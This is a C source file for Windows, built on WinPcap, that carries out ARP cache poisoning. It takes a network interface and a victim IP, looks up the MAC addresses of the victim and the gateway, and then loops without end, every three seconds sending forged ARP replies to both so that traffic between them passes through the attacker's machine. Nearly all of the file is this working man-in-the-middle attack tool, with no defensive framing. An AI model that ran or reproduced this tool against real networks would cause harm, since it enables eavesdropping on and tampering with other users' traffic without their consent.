#define HAVE_REMOTE
 
#include <stdio.h>
#include <pcap.h>
#include <Windows.h>
#include <Shlwapi.h>
#include <iphlpapi.h>

#include "../WinPcapExamples/Packets.h"
#include "../WinPcapExamples/Config.h"

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "wpcap.lib")


#define SLEEP_BETWEEN_ARPS 50

void resolveIP(char *pIPStr, unsigned char *pVictimMAC);
int SendARPPoison(PSCANPARAMS pScanParams);

/*
 * Global variables
 *
 */
CRITICAL_SECTION gWriteLog; 





/*
 * Program entry point
 * Command line arguments : ifc-name  Victim-IP
 *
 */
int main(int argc, char **argv)
{
  DWORD lRetVal = 0;
  ARPPacket lARPPacket;
  SCANPARAMS lScanParams;
  unsigned long lDstIP = 0;
  HANDLE lThreadHandle = INVALID_HANDLE_VALUE;
  DWORD lThreadId = 0;
  int lCounter = 0;
  pcap_if_t *lDevice = NULL;
  char lTemp[PCAP_ERRBUF_SIZE];
  char *lIFCName = argv[1];

IPAddr lVictimIPAddr;
ULONG lVictimMACAddrLen = 6;
/*
  char lSendData[32] = "Data Buffer";
  DWORD lReplySize = 0;
  LPVOID lReplyBuffer = NULL;
  unsigned long ipaddr = 0;

  char *lIFCName = argv[1];
  HANDLE lARPReplyThreadHandle = INVALID_HANDLE_VALUE;
  DWORD lARPReplyThreadID = 0;
  struct sockaddr_in lPeerIP;
  char lPeerIPStr[MAX_BUF_SIZE + 1];
*/

  /*
   * Initialisation
   */
  ZeroMemory(&lScanParams, sizeof(lScanParams));
  InitializeCriticalSectionAndSpinCount(&gWriteLog, 0x00000400);

  if (argc >= 3)
  {
    ZeroMemory(&lARPPacket, sizeof(lARPPacket));
    strncpy(lScanParams.IFCString, argv[1], sizeof(lScanParams.IFCString)-1);
    GetIFCDetails(argv[1], &lScanParams);

    /*
     * Get victim IP address
     */
    lVictimIPAddr = inet_addr(argv[2]);
    CopyMemory(lScanParams.VictimIP, &lVictimIPAddr, 4);
    resolveIP(argv[2], lScanParams.VictimMAC);
    
    MAC2String(lScanParams.LocalMAC, lScanParams.LocalMACStr, MAX_MAC_LEN);
    IP2String(lScanParams.LocalIP, lScanParams.LocalIPStr, MAX_IP_LEN);

    MAC2String(lScanParams.GWMAC, lScanParams.GWMACStr, MAX_MAC_LEN);
    IP2String(lScanParams.GWIP, lScanParams.GWIPStr, MAX_IP_LEN);

    MAC2String(lScanParams.VictimMAC, lScanParams.VictimMACStr, MAX_MAC_LEN);
    IP2String(lScanParams.VictimIP, lScanParams.VictimIPStr, MAX_IP_LEN);

printf("Local  : %-15s-> %s\n", lScanParams.VictimIPStr, lScanParams.LocalMACStr);
printf("GW     : %-15s-> %s\n", lScanParams.GWIPStr, lScanParams.GWMACStr);
printf("Victim : %-15s-> %s\n", lScanParams.VictimIPStr, lScanParams.VictimMACStr);


    /*
     * Open interface.
     */
    if ((lScanParams.IfcWriteHandle = pcap_open(lIFCName, 65536, PCAP_OPENFLAG_NOCAPTURE_LOCAL|PCAP_OPENFLAG_MAX_RESPONSIVENESS, 5, NULL, lTemp)) != NULL)
    {

      while (1)
      {
        printf("Victim (%s) <--- Local (%s) ---> GW (%s)\n", lScanParams.VictimIPStr, lScanParams.LocalIPStr, lScanParams.GWIPStr);
        SendARPPoison(&lScanParams);
//        SendARPPoison(&lScanParams, lSysList[lCounter].lSysMAC, lSysList[lCounter].lSysIPBin);
        Sleep(3000);
      }

      if (lScanParams.IfcWriteHandle)
        pcap_close((pcap_t *) lScanParams.IfcWriteHandle);

    } // if ((lIFCHandle...
    else
      LogMsg("main() : pcap_open() failed\n");

  } // if (argc >= 4)...

  return(lRetVal);
}







/*
 *
 *
 */
int SendARPPacket(pcap_t *pIFCHandle, PARPPacket pARPPacket)
{
  int lRetVal = NOK;
  unsigned char lARPPacket[sizeof(ETHDR) + sizeof(ARPHDR)];
  int lCounter = 0;
  PETHDR lEHdr = (PETHDR) lARPPacket;
  PARPHDR lARPHdr = (PARPHDR) (lARPPacket + 14);


  ZeroMemory(lARPPacket, sizeof(lARPPacket));

  /*
   * Layer 2 (Physical)
   */
  CopyMemory(lEHdr->ether_shost, pARPPacket->Eth_SrcMAC, BIN_MAC_LEN);
  CopyMemory(lEHdr->ether_dhost, pARPPacket->Eth_DstMAC, BIN_MAC_LEN);
  lEHdr->ether_type = htons(ETHERTYPE_ARP);


  /*
   * Layer 2/3
   */
  lARPHdr->htype = htons(0x0001); // Ethernet
  lARPHdr->ptype = htons(0x0800); // Protocol type on the upper layer : IP
  lARPHdr->hlen = 0x0006; // Ethernet address length : 6
  lARPHdr->plen = 0x0004; // Number of octets in upper protocol layer : 4
  lARPHdr->oper = htons(pARPPacket->lReqType);

  CopyMemory(lARPHdr->tpa, pARPPacket->ARP_DstIP, BIN_IP_LEN);
  CopyMemory(lARPHdr->tha, pARPPacket->ARP_Dst_MAC, BIN_MAC_LEN);

  CopyMemory(lARPHdr->spa, pARPPacket->ARP_LocalIP, BIN_IP_LEN);
  CopyMemory(lARPHdr->sha, pARPPacket->ARP_LocalMAC, BIN_MAC_LEN);


  /* 
   * Send down the packet
   */
  if (pIFCHandle != NULL && pcap_sendpacket(pIFCHandle, lARPPacket, sizeof(ETHDR) + sizeof(ARPHDR)) == 0)
    lRetVal = OK;
  else
 	  LogMsg("SendARPPacket() : Error occured while sending the packet: %s\n", pcap_geterr(pIFCHandle));


  return(lRetVal);
}




void MAC2String(unsigned char pMAC[BIN_MAC_LEN], unsigned char *pOutput, int pOutputLen)
{
  if (pOutput && pOutputLen > 0)
  {
    snprintf((char *) pOutput, pOutputLen, "%02X:%02X:%02X:%02X:%02X:%02X", pMAC[0], pMAC[1], pMAC[2], pMAC[3], pMAC[4], pMAC[5]);
  }
}

void IP2String(unsigned char pIP[BIN_IP_LEN], unsigned char *pOutput, int pOutputLen)
{
  if (pOutput && pOutputLen > 0)
    snprintf((char *) pOutput, pOutputLen, "%d.%d.%d.%d", pIP[0], pIP[1], pIP[2], pIP[3]);
}




/*
 *
 *
 */
int GetIFCDetails(char *pIFCName, PSCANPARAMS pScanParams)
{
  int lRetVal = 0;
  unsigned long lLocalIPAddr = 0;
  unsigned long lGWIPAddr = 0;
  ULONG lGWMACAddr[2];
  ULONG lGWMACAddrLen = 6;
  PIP_ADAPTER_INFO lAdapterInfoPtr = NULL;
  PIP_ADAPTER_INFO lAdapter = NULL;
  DWORD lFuncRetVal = 0;
  ULONG lOutBufLen = sizeof (IP_ADAPTER_INFO);


  if ((lAdapterInfoPtr = (IP_ADAPTER_INFO *) HeapAlloc(GetProcessHeap(), 0, sizeof (IP_ADAPTER_INFO))) == NULL)
  {
    LogMsg("getIFCDetails() : Error allocating memory needed to call GetAdaptersinfo\n");
    lRetVal = 1;
    goto END;
  } // if ((lAdapterInfo...


  if (GetAdaptersInfo(lAdapterInfoPtr, &lOutBufLen) == ERROR_BUFFER_OVERFLOW) 
  {
    HeapFree(GetProcessHeap(), 0, lAdapterInfoPtr);
    if ((lAdapterInfoPtr = (IP_ADAPTER_INFO *) HeapAlloc(GetProcessHeap(), 0, lOutBufLen)) == NULL)
    {
      LogMsg("getIFCDetails() : Error allocating memory needed to call GetAdaptersinfo");
      lRetVal = 2;
      goto END;
    } // if ((lAdap...
  } // if (GetAdapte...



  /*
   *
   *
   */
  if ((lFuncRetVal = GetAdaptersInfo(lAdapterInfoPtr, &lOutBufLen)) == NO_ERROR) 
  {
    for (lAdapter = lAdapterInfoPtr; lAdapter; lAdapter = lAdapter->Next)
    {
      if (StrStrI(pIFCName, lAdapter->AdapterName))
	     {
        // Get local MAC address
        CopyMemory(pScanParams->LocalMAC, lAdapter->Address, BIN_MAC_LEN);

        // Get local IP address
        lLocalIPAddr = inet_addr(lAdapter->IpAddressList.IpAddress.String);
        CopyMemory(pScanParams->LocalIP, &lLocalIPAddr, 4);


      		// Get gateway IP address
        lGWIPAddr = inet_addr(lAdapter->GatewayList.IpAddress.String);
        CopyMemory(pScanParams->GWIP, &lGWIPAddr, 4);


        // Get gateway MAC address
        CopyMemory(pScanParams->GWIP, &lGWIPAddr, 4); // ????
        ZeroMemory(&lGWMACAddr, sizeof(lGWMACAddr));
        SendARP(lGWIPAddr, 0, lGWMACAddr, &lGWMACAddrLen);
        CopyMemory(pScanParams->GWMAC, lGWMACAddr, 6);

		      // Get interface index.
		      pScanParams->Index = lAdapter->Index;

		      // Get interface description
		      CopyMemory(pScanParams->IFCDescr, lAdapter->Description, sizeof(pScanParams->IFCDescr) - 1);

        break;
	     } // if (StrSt...
    } // for (lAdapt...


  }
  else
  {
    lRetVal = 1;
  } // if ((lFunc...

END:
  if (lAdapterInfoPtr)
    HeapFree(GetProcessHeap(), 0, lAdapterInfoPtr);


  return(lRetVal);
}





/*
 *
 *
 */
void LogMsg(char *pMsg, ...)
{
  HANDLE lFH = INVALID_HANDLE_VALUE;
  OVERLAPPED lOverl = { 0 };
  char lDateStamp[MAX_BUF_SIZE + 1];
  char lTimeStamp[MAX_BUF_SIZE + 1];
  char lTime[MAX_BUF_SIZE + 1];
  char lTemp[MAX_BUF_SIZE + 1];
  char lLogMsg[MAX_BUF_SIZE + 1];
  DWORD lBytedWritten = 0;
  va_list lArgs;


  EnterCriticalSection(&gWriteLog);

  ZeroMemory(lTime, sizeof(lTime));
  ZeroMemory(lTimeStamp, sizeof(lTimeStamp));
  ZeroMemory(lDateStamp, sizeof(lDateStamp));


  /*
   * Create timestamp
   */
  _strtime(lTimeStamp);
  _strdate(lDateStamp);
  snprintf(lTime, sizeof(lTime) - 1, "%s %s", lDateStamp, lTimeStamp);

  /*
   * Create log message
   */
  ZeroMemory(lTemp, sizeof(lTemp));
  ZeroMemory(lLogMsg, sizeof(lLogMsg));
  va_start (lArgs, pMsg);
  vsprintf(lTemp, pMsg, lArgs);
  va_end(lArgs);
  snprintf(lLogMsg, sizeof(lLogMsg) - 1, "%s : %s\n", lTime, lTemp);
  printf(lLogMsg);
  
  LeaveCriticalSection(&gWriteLog);
}



/*
 *
 *
 */
void resolveIP(char *pIPStr, unsigned char *pVictimMAC)
{
  unsigned long lVictimIPAddr = 0;
  ULONG lVictimMACAddrLen = BIN_MAC_LEN;

  if (pIPStr != NULL)
  {
    // Get victim IP address
    lVictimIPAddr = inet_addr(pIPStr);
    SendARP(lVictimIPAddr, 0, pVictimMAC, &lVictimMACAddrLen);
  } // if (pIPStr != ...
}



/*
 * Ethr:	LocalMAC -> VicMAC
 * ARP :	LocMAC/GW-IP -> VicMAC/VicIP
 *
 */
int SendARPPoison(PSCANPARAMS pScanParams)
{
  int lRetVal = OK;
  ARPPacket lARPPacket;

  if (pScanParams != NULL && pScanParams->IfcWriteHandle != NULL)
  {
    if (memcmp(pScanParams->VictimMAC, pScanParams->GWMAC, BIN_MAC_LEN) != 0)
    {
      printf("Victim (%s) <--- Local (%s) ---> GW (%s)\n", pScanParams->VictimIPStr, pScanParams->LocalIPStr, pScanParams->GWIPStr);

      /*
       * Poisoning from A to B.
       */
      ZeroMemory(&lARPPacket, sizeof(lARPPacket));
	 
      lARPPacket.lReqType = ARP_REPLY;
      // Set MAC values
      CopyMemory(lARPPacket.Eth_SrcMAC, pScanParams->LocalMAC, BIN_MAC_LEN);
      CopyMemory(lARPPacket.Eth_DstMAC, pScanParams->VictimMAC, BIN_MAC_LEN);

      // Set ARP reply values
      CopyMemory(lARPPacket.ARP_LocalMAC, pScanParams->LocalMAC, BIN_MAC_LEN);
      CopyMemory(lARPPacket.ARP_LocalIP, pScanParams->GWIP, BIN_IP_LEN);

      CopyMemory(lARPPacket.ARP_Dst_MAC, pScanParams->VictimMAC, BIN_MAC_LEN);
      CopyMemory(lARPPacket.ARP_DstIP, pScanParams->VictimIP, BIN_IP_LEN);
//printf("Poison(1) %s/%s    %s/%s -> %s/%s\n", lLocalMAC, lVicMAC, lLocalMAC, lGWIP, lVicMAC, lVicIP);


      // Send packet
      if (SendARPPacket((pcap_t *) pScanParams->IfcWriteHandle, &lARPPacket) != 0)
      {
        LogMsg("SendARPPoison() : Unable to send ARP packet.");
        lRetVal = NOK;
      } // if (SendARPPacket(lIF...


      /*
       * Poisoning from B to A.
       */

      ZeroMemory(&lARPPacket, sizeof(lARPPacket));

      lARPPacket.lReqType = ARP_REPLY;
      // Set MAC values
      CopyMemory(lARPPacket.Eth_SrcMAC, pScanParams->LocalMAC, BIN_MAC_LEN);
      CopyMemory(lARPPacket.Eth_DstMAC, pScanParams->GWMAC, BIN_MAC_LEN);

      // Set ARP reply values
      CopyMemory(lARPPacket.ARP_LocalMAC, pScanParams->LocalMAC, BIN_MAC_LEN);
      CopyMemory(lARPPacket.ARP_LocalIP, pScanParams->VictimIP, BIN_IP_LEN);

      CopyMemory(lARPPacket.ARP_Dst_MAC, pScanParams->GWMAC, BIN_MAC_LEN);
      CopyMemory(lARPPacket.ARP_DstIP, pScanParams->GWIP, BIN_IP_LEN);

      // Send packet
      if (SendARPPacket((pcap_t *) pScanParams->IfcWriteHandle, &lARPPacket) != 0)
      {
        LogMsg("SendARPPoison() : Unable to send ARP packet.");
        lRetVal = NOK;
      } // if (SendARPPacket(lIF...
    } // if (memcmp(pVictimM...
  } // if (pScanParams != NULL && pScanP


  return(lRetVal);
}